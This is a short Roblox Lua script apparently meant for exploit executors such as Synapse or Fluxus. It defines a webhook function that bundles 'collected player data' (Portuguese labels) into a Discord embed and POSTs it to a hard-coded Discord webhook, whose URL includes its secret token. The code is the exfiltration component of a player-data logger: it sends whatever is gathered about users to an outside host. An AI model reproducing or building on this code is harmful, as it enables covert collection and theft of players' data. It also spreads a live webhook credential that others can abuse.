local HttpService = game:GetService("HttpService")

function webhook(dados)
    local fields = {}
    for k, v in pairs(dados) do
        table.insert(fields, {
            name = k,
            value = tostring(v),
            inline = false
        })
    end

    local payload = {
        content = "<@1350457070972829810> 📡 Dados do player coletados!",
        embeds = {{
            title = "🧾 Informações do Jogador",
            color = 3447003,
            fields = fields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local url = "https://discord.com/api/webhooks/1387626477373358211/O-T52fqk8Nmo0ag8rBlVvcxR47VdnzoUS6aKqS72IPq-pt_3sQSLSKu7r3eH4GYM_e3W"
    local json = HttpService:JSONEncode(payload)

    local req = (http_request or request or syn and syn.request or fluxus and fluxus.request)
    if req then
        req({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end
end
